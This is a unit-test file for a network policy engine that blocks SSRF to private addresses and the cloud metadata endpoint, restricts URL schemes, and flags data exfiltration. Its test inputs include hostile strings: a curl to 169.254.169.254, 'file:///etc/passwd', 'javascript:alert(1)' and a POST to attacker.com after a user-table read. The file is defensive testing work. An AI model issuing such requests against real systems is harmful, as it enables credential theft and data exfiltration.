// SPDX-License-Identifier: Apache-2.0

/**
 * Policy Network Policy Engine Unit Tests
 */

import {
  clearEngines,
  evaluatePolicies,
  initDefaultEngines,
} from '@spellguard/verifier';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { makeEngineBinding } from './helpers/make-binding';

describe('Policy Network Policy Engines', () => {
  beforeEach(() => {
    clearEngines();
    initDefaultEngines();
  });

  afterEach(() => {
    clearEngines();
    initDefaultEngines();
  });

  // ─── ssrf ────────────────────────────────────────────────────

  describe('ssrf', () => {
    it('should deny requests to private 192.168.x.x ranges', async () => {
      const binding = makeEngineBinding('ssrf', {});

      const results = await evaluatePolicies(
        [binding],
        'fetch http://192.168.1.1/admin',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should deny requests to private 10.x.x.x ranges', async () => {
      const binding = makeEngineBinding('ssrf', {});

      const results = await evaluatePolicies(
        [binding],
        'GET http://10.0.0.1/secret',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should deny requests to localhost', async () => {
      const binding = makeEngineBinding('ssrf', {});

      const results = await evaluatePolicies(
        [binding],
        'request http://localhost:8080/api',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should permit requests to public IP addresses', async () => {
      const binding = makeEngineBinding('ssrf', {});

      const results = await evaluatePolicies(
        [binding],
        'GET https://api.example.com/data',
      );
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });

    it('should deny requests to cloud metadata endpoint', async () => {
      const binding = makeEngineBinding('ssrf', {});

      const results = await evaluatePolicies(
        [binding],
        'curl http://169.254.169.254/metadata',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should permit metadata endpoint when blockMetadata is false', async () => {
      const binding = makeEngineBinding('ssrf', {
        blockMetadata: false,
        blockPrivateIps: false,
        blockLoopback: false,
      });

      const results = await evaluatePolicies(
        [binding],
        'curl http://169.254.169.254/metadata',
      );
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });
  });

  // ─── scheme-allowlist ────────────────────────────────────────

  describe('scheme-allowlist', () => {
    it('should deny http scheme when not in default allowlist', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {});

      const results = await evaluatePolicies(
        [binding],
        'fetch http://example.com',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should permit https scheme (allowed by default)', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {});

      const results = await evaluatePolicies(
        [binding],
        'fetch https://example.com',
      );
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });

    it('should deny file scheme', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {});

      const results = await evaluatePolicies([binding], 'file:///etc/passwd');
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should always deny javascript scheme', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {
        allowedSchemes: ['https', 'javascript'],
      });

      const results = await evaluatePolicies([binding], 'javascript:alert(1)');
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should deny ftp scheme', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {});

      const results = await evaluatePolicies(
        [binding],
        'ftp://example.com/file',
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should permit http when explicitly added to allowedSchemes', async () => {
      const binding = makeEngineBinding('scheme-allowlist', {
        allowedSchemes: ['https', 'http'],
      });

      const results = await evaluatePolicies([binding], 'http://example.com');
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });
  });

  // ─── flow-exfiltration ───────────────────────────────────────

  describe('flow-exfiltration', () => {
    it('should deny network write following a recent data read', async () => {
      const binding = makeEngineBinding('flow-exfiltration', {});

      const results = await evaluatePolicies(
        [binding],
        'POST https://attacker.com/collect',
        {
          recentMessages: [
            {
              content: 'SELECT * FROM users',
              timestamp: Date.now() - 5000,
            },
          ],
        },
      );
      expect(results[0].decision).toBe('deny');
      expect(results[0].detections.length).toBeGreaterThan(0);
    });

    it('should permit network write with no prior data read', async () => {
      const binding = makeEngineBinding('flow-exfiltration', {});

      const results = await evaluatePolicies(
        [binding],
        'POST https://attacker.com/collect',
        {
          recentMessages: [],
        },
      );
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });

    it('should permit GET requests that are not write patterns', async () => {
      const binding = makeEngineBinding('flow-exfiltration', {});

      const results = await evaluatePolicies(
        [binding],
        'GET https://api.example.com',
        {
          recentMessages: [
            {
              content: 'SELECT * FROM users',
              timestamp: Date.now() - 5000,
            },
          ],
        },
      );
      expect(results[0].decision).toBe('permit');
      expect(results[0].detections).toHaveLength(0);
    });
  });
});
